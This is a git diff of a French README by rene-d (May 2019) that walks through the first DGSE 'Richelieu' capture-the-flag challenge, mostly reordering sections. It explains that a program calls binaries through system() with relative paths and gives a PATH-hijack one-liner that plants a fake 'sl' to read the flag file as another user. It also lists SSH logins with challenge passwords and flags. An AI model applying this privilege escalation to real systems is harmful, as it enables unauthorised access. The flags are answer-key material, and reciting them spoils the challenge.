@@ -1,7 +1,9 @@
 # Challenge Richelieu de la DGSE - défi 1
+
 https://www.challengecybersec.fr
 
 ## Pour se connecter à la machine du défi
+
 ```
 ssh defi1.challengecybersec.fr -l defi1 -p 2222
 
@@ -9,6 +11,7 @@ mot de passe : DGSE{2f77c517b06f1cd1ce864f79f41f25ca8874413c8c1204f7ec9c6728c87f
 ```
 
 ## Le challenge
+
 ```
 defi1@AttrapeLeDrapeau:~$ ls -al
 total 44
@@ -42,6 +45,7 @@ Menu :
 ```
 
 ## La vulnérabilité
+
 `prog.bin` lance des binaires avec `system()`:
 * choix 1: `date '+Nous sommes le %d/%m/%Y et il est %H:%M:%S'`
 * choix 2: `date '+Nombre de secondes depuis Epoch : %s'`
@@ -51,23 +55,9 @@ Menu :
 Cela peut être observé avec [Ghidra](https://ghidra-sre.org), gdb, ou l'intuition.
 Le chemin des binaires n'est pas absolu: la variable d'environnement `PATH` est donc utilisée.
 
-## L'attaque
-Il suffit d'altérer le `PATH` and ajoutant un programme `sl` (par exemple) avant `/usr/bin`. Ce programme sera exécuté avec les privilèges de l'utilisateur `defi1-drapeau` et permettra de consulter le fichier `drapeau.txt`.
-```bash
-echo "cat drapeau.txt" > sl; chmod a+x sl; PATH=$HOME:$PATH ; echo 3 | ./prog.bin
-```
+### Note
 
-## Le drapeau
-```
-Suite du challenge Richelieu :
-
-ssh defi2.challengecybersec.fr -l defi2 -p 2222
-
-mot de passe : DGSE{H#M?W)el{0YZ-)77/C#ogrp}k4&EbP}
-```
-
-## Note
-Pour récupérer `./prog.bin` ou autre depuis le container du challenge:
+Pour récupérer `./prog.bin` ou autre depuis la connexion ssh du challenge:
 
 ```bash
 ssh defi1.challengecybersec.fr -l defi1 -p 2222 > prog.hex
@@ -77,6 +67,25 @@ exit
 grep -E "^([0-9a-z]{2} )+" prog.hex | xxd -r -p > prog.bin
 chmod a+x prog.bin
 ```
+
+## L'attaque
+
+Il suffit d'altérer le `PATH` and ajoutant un programme `sl` (par exemple) avant `/usr/bin`. Ce programme sera exécuté avec les privilèges de l'utilisateur `defi1-drapeau` et permettra de consulter le fichier `drapeau.txt`.
+```bash
+echo "cat drapeau.txt" > sl; chmod a+x sl; PATH=$HOME:$PATH ; echo 3 | ./prog.bin
+```
+
+## Le drapeau
+
+```
+Suite du challenge Richelieu :
+
+ssh defi2.challengecybersec.fr -l defi2 -p 2222
+
+mot de passe : DGSE{H#M?W)el{0YZ-)77/C#ogrp}k4&EbP}
+```
+
+[Suite...](../defi2/README.md)
 
 ---
 *rene-d 26 mai 2019*
